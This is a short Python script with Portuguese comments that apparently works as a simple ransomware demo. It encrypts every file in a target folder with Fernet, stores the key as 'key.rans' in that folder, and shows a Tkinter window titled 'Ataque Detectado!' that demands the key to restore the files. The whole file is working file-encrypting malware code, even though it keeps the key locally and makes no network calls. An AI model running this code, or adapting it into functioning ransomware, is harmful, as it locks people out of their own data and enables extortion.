from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import messagebox, simpledialog

# Função para criptografar arquivos em uma pasta
def encrypt_folder(folder_path, key):
    cipher = Fernet(key)
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
            encrypted_data = cipher.encrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)

# Função para descriptografar arquivos em uma pasta
def decrypt_files(folder_path, key):
    cipher = Fernet(key)
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = cipher.decrypt(encrypted_data)
            with open(file_path, 'wb') as file:
                file.write(decrypted_data)

# Função para salvar a chave em um arquivo
def save_key_to_file(folder_path, key):
    key_file_path = os.path.join(folder_path, 'key.rans')
    with open(key_file_path, 'wb') as key_file:
        key_file.write(key)

# Função para exibir a janela de descriptografia
def display_decrypt_window(folder_path, key):
    def on_decrypt():
        entered_key = key_entry.get().encode('utf-8')
        if entered_key == key:
            decrypt_files(folder_path, key)
            messagebox.showinfo("Descriptografia", "Arquivos descriptografados com sucesso!")
            root.destroy()
        else:
            messagebox.showerror("Erro", "Chave incorreta!")

    root = tk.Tk()
    root.title("Ataque Detectado!")
    label = tk.Label(root, text="Seus arquivos foram criptografados. Insira a chave para descriptografá-los:")
    label.pack(pady=20)
    key_entry = tk.Entry(root)
    key_entry.pack(pady=20)
    decrypt_button = tk.Button(root, text="Descriptografar", command=on_decrypt)
    decrypt_button.pack(pady=20)
    root.mainloop()

# Código principal
key = Fernet.generate_key()
encrypt_folder('./target_folder', key)
save_key_to_file('./target_folder', key)
display_decrypt_window('./target_folder', key)

# Execute esse comando
# display_decrypt_window('./target_folder', key)
